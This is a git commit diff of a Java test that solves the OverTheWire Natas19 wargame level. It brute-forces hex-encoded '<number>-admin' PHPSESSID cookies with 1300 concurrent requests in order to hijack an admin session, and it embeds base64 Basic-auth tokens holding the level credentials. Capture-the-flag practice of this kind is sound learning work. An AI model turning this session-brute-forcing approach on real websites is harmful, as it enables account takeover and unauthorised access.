bf78160d5384161cb719e5ed7861bb7c2f188e88
Igor Terekhin <igoryanterehin@gmail.com>
2023-09-12 00:32:38 +0100

    Natas19 solved; Natas18 - changed method name;

--- src/test/java/Natas19.java
+++ src/test/java/Natas19.java
@@ -5,39 +5,47 @@ import org.jsoup.Jsoup;
 import org.jsoup.nodes.Document;
 import org.junit.jupiter.api.Test;
 
+import javax.xml.bind.DatatypeConverter;
 import java.io.IOException;
-import java.util.Arrays;
-import java.util.HashMap;
-import java.util.Map;
+import java.nio.charset.StandardCharsets;
+import java.util.*;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
 
-public class Natas18 extends BaseClass {
-    final String url = "http://natas18.natas.labs.overthewire.org/index.php";
-    final String authToken = "Basic bmF0YXMxODo4TkVEVVV4ZzhrRmdQVjg0dUx3dlprR242b2tKUTZhcQ==";
+public class Natas19 extends BaseClass {
+    final String url = "http://natas19.natas.labs.overthewire.org/index.php";
+    final String authToken = "Basic bmF0YXMxOTo4TE1KRWhLRmJNS0lMMm14UUtqdjBhRURkazd6cFQwcw==";
+
+
+    public String encodeToken(String cookie) {
+        StringBuilder sb = new StringBuilder();
+        sb.append(cookie);
+        sb.append("-admin");
+        byte[] stringAsByteArr = sb.toString().getBytes(StandardCharsets.UTF_8);
+        return  DatatypeConverter.printHexBinary(stringAsByteArr).toLowerCase(Locale.ROOT);
+    }
 
 
 
     @Test
     public void kickOutSession() throws InterruptedException {
         RestAssured.config = RestAssured.config().connectionConfig(new ConnectionConfig().closeIdleConnectionsAfterEachResponseAfter(10, TimeUnit.SECONDS));
-        int numberOfRequests = 650;
+        int numberOfRequests = 1300;
         ExecutorService executorService = Executors.newFixedThreadPool(numberOfRequests);
-
 
         Map<String, String> params = new HashMap<>();
         params.put("username", "admin");
         params.put("password", "secret");
         params.put("debug", "y");
+
         for (int i = 0; i < numberOfRequests; i++) {
             int finalI = i;
             executorService.submit(() -> {
-                Response response = getRequestWithParamsAndCookie(url, authToken, params, "PHPSESSID", Integer.toString(finalI));
+                Response response = getRequestWithParamsAndCookie(url, authToken, params, "PHPSESSID", encodeToken(String.valueOf(finalI)));
                 Document doc = Jsoup.parse(response.getBody().asString());
                 try {
-                    writeTextToFile("src/test/resources/responses.txt", doc.select("#content").text() +
-                            " " + response.getHeader("Date") + " " + response.getCookie("PHPSESSID"));
+                    writeTextToFile("src/test/resources/responses2.txt", doc.select("#content").text());
                 } catch (IOException e) {
                     System.out.println("Something went wrong: " + Arrays.toString(e.getStackTrace()));
                 }
@@ -45,7 +53,5 @@ public class Natas18 extends BaseClass {
         }
         executorService.shutdown();
         executorService.awaitTermination(100, TimeUnit.SECONDS);
-     }
-
     }
-
+}
